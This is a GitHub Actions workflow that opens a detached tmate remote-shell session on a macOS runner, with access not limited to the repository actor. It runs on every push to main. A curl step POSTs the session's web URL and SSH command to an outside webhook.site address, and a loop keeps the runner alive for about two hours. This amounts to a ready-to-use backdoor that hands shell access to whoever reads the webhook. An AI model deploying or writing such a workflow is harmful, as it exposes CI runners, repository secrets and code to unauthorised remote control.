name: macOS Interactive Session

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  interactive:
    runs-on: macos-15
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Tmate
        id: tmate
        uses: mxschmitt/action-tmate@v3
        with:
          detached: true
          limit-access-to-actor: false

      - name: Post Tmate URL
        run: |
          URL="${{ steps.tmate.outputs.web-url }}"
          SSH="${{ steps.tmate.outputs.ssh-command }}"
          echo "Outputs URL: $URL"
          echo "Outputs SSH: $SSH"
          
          # Also try direct display command if output was empty
          if [ -z "$URL" ]; then
            URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}' 2>/dev/null || true)
          fi
          if [ -z "$SSH" ]; then
            SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' 2>/dev/null || true)
          fi
          
          curl -s -X POST -d "WEB: $URL | SSH: $SSH" https://webhook.site/696691ee-e300-4d4e-a17f-c4f805414baa || true

      - name: Keep Alive
        run: |
          for i in {1..720}; do
            sleep 10
          done
